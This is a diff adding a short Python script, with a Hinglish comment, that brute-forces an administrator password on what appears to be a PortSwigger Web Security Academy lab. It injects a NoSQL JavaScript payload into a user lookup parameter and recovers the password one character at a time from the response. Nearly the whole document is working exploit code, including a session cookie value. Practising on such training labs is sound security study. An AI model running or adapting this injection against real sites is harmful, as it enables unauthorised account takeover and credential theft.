@@ -1,0 +1,33 @@
+##
+Yeh Python script administrator ke password ko brute-force karne ke liye likhi gayi hai. (Cookie value replace karna mat bhoolna!)
+
+#####
+import requests
+from string import ascii_lowercase
+
+url = "https://0a33003104f705d9805d71a600610004.web-security-academy.net/user/lookup?user=administrator"
+cookies = {"session": "7Q2nMnlORzcADJf3AgClKqe2QnW5qPk9"}
+proxies = {"http": "http://localhost:8080", "https": "https://localhost:8080"}
+
+def main() -> None:
+    password = ""
+    attempt = 0
+    while attempt < 8:
+        for c in ascii_lowercase:
+            payload = f"' && this.password[{attempt}] == '{c}' || 'a'=='b"
+            print(payload)
+            target_url = f"{url}{requests.utils.quote(payload)}"
+            
+            resp_json = requests.get(target_url, cookies=cookies).json()
+            try:
+                if resp_json["email"] == "admin@normal-user.net":
+                    print(f"Found next character: {c}")
+                    password += c
+                    attempt += 1
+            except KeyError:
+                continue
+
+    print(f"Administrator password = {password}")
+
+if __name__ == "__main__":
+    main()
